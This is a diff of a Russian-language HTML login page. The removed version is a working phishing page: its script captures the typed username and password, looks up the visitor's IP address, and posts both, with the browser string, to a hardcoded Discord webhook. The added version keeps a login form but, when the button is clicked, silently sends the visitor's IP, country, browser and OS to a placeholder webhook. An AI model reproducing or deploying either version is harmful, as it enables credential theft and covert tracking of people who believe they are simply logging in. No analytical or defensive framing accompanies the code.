@@ -1,76 +1,56 @@
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <meta charset="UTF-8">
-    <title>Страница входа</title>
-</head>
-<body>
-    <h1>Добро пожаловать на страницу входа!</h1>
+    <title>Мой сайт</title>
+  </head>
+  <body>
+    <h1>Добро пожаловать!</h1>
 
-    <!-- Форма для ввода логина и пароля -->
-    <form id="login-form">
-        <label for="username">Имя пользователя:</label>
-        <input type="text" id="username" name="username"><br><br>
-        <label for="password">Пароль:</label>
-        <input type="password" id="password" name="password"><br><br>
-        <input type="submit" value="Войти">
-    </form>
-
-    <!-- JavaScript код для отправки данных на вебхук в Discord -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <script>
-        // Функция для отправки данных на вебхук в Discord
-        function sendToDiscord(username, password, ip, browser) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0");
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({
-                embeds: [{
-                    title: 'Новый пользователь залогинился',
-                    color: 16711680,
-                    fields: [
-                        {
-                            name: 'Имя пользователя',
-                            value: username
-                        },
-                        {
-                            name: 'Пароль',
-                            value: password
-                        },
-                        {
-                            name: 'IP-адрес',
-                            value: ip
-                        },
-                        {
-                            name: 'Браузер',
-                            value: browser
-                        }
-                    ]
-                }]
-            }));
-        }
+      const webhookUrl = 'https://discord.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz';
 
-        // Обработчик события отправки формы
-        document.getElementById('login-form').addEventListener('submit', function (event) {
-            event.preventDefault();
-            // Получаем данные из полей формы
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            // Получаем IP-адрес и информацию о браузере
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    fetch(`https://ipapi.co/${data.ip}/json/`)
-                        .then(response => response.json())
-                        .then(data => {
-                            var browser = navigator.userAgent;
-                            // Отправляем данные на вебхук в Discord
-                            sendToDiscord(username, password, data.ip, browser);
-                            // Сбрасываем значения полей формы
-                            document.getElementById('username').value = '';
-                            document.getElementById('password').value = '';
-                        });
-                });
+      function sendToWebhook(data) {
+        axios.post(webhookUrl, {
+          embeds: [{
+            title: 'Новый пользователь!',
+            description: 'IP-адрес: ' + data.ip + '\nБраузер: ' + data.browser + '\nСтрана: ' + data.country + '\nОС: ' + data.os,
+          }]
         });
+      }
+
+      function collectData() {
+        const data = {
+          ip: null,
+          browser: null,
+          country: null,
+          os: null,
+        };
+
+        axios.get('https://api.ipify.org?format=json')
+          .then(response => {
+            data.ip = response.data.ip;
+            return axios.get('https://ipapi.co/' + data.ip + '/json/');
+          })
+          .then(response => {
+            data.country = response.data.country_name;
+            data.browser = navigator.userAgent;
+            data.os = navigator.platform;
+
+            sendToWebhook(data);
+          })
+          .catch(error => console.error(error));
+      }
+
+      document.querySelector('#login-button').addEventListener('click', () => {
+        collectData();
+        // здесь можно добавить код для обработки логина пользователя
+      });
     </script>
-</body>
+
+    <input type="text" placeholder="Имя пользователя">
+    <input type="password" placeholder="Пароль">
+    <button id="login-button">Войти</button>
+  </body>
 </html>
